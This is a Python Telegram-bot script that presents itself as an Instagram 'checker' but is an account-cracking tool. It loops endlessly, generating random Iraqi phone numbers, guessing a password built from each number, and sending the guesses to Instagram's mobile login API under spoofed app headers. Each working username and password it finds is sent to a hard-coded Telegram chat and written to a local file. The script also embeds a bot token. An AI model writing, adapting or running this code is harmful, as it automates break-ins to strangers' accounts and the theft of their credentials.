import os
import uuid
from random import *
import string
import requests
from user_agent import generate_user_agent
from datetime import datetime
import time
import pyfiglet
import pyfiglet, os
from time import sleep
import webbrowser
Z = '\x1b[2;31m'
G = '\x1b[1;32m'
import random, uuid, requests, string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
from uuid import uuid4
import telebot
from telebot import types
import telebot
aa = 0
zz = 0

ID = ("1782851959")
tok = ("1821639951:AAGDHL3rA9EF014T189abVwq78PUnxQNUjc")

bot = telebot.TeleBot(token=tok,parse_mode=None)
@bot.message_handler(commands=['start'])
def start(message):
            mess = message.text
            pip = types.InlineKeyboardMarkup()
            ipp  = types.InlineKeyboardButton(text = "🚸 start 🚸", callback_data = 'ip')
            pip.add(ipp)
            bjj = message.chat.id
            channel = bot.send_message(message.chat.id, f"""Ξ 𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝗯𝗼𝘁 𝗰𝗵𝗲𝗰𝗸𝗲𝗿 𝗶𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺

Ξ 𝗱𝗲𝘃 -> @ZZBoTs - @PiPPi

Ξ 𝗰𝗹𝗶𝗰𝗸 𝘀𝘁𝗮𝗿𝘁 𝗰𝗵𝗲𝗰𝗸""", reply_markup=pip)
@bot.callback_query_handler(func=lambda message: True)
def callback_query(call):
            global aa,zz,E,G,S,ID,bot
            if call.data =="ip":
                start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️").json()
                id_msg = start_msg['result']['message_id']
                r = requests.Session()
                user = '0987654321'
                while True:
                    us = str(''.join((random.choice(user) for i in range(7))))
                    username = '+964770' + us
                    password = '0770' + us
                    url = 'https://i.instagram.com/api/v1/accounts/login/'
                    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
                    uid = str(uuid4())
                    data = {'uuid':uid, 
             'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
                    req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                    if 'logged_in_user' in req_login.text:
                        zz += 1
                        
                        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @ZzBoTs - @PiPPi"
                        i = requests.post(tlg)
                        with open('Dome.txt', 'a') as (HACKED):
                            HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                    
                    else:
                        requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 : {username}\n\n[✅] 𝗗𝗼𝗻𝗲 : {zz}\n\n[❌] 𝗕𝗮𝗱 : {aa}\n\nΞ 𝗙𝗿𝗼𝗺 : @ZzBoTs - @PiPPi")
                        
                        aa += 1
bot.polling(True)
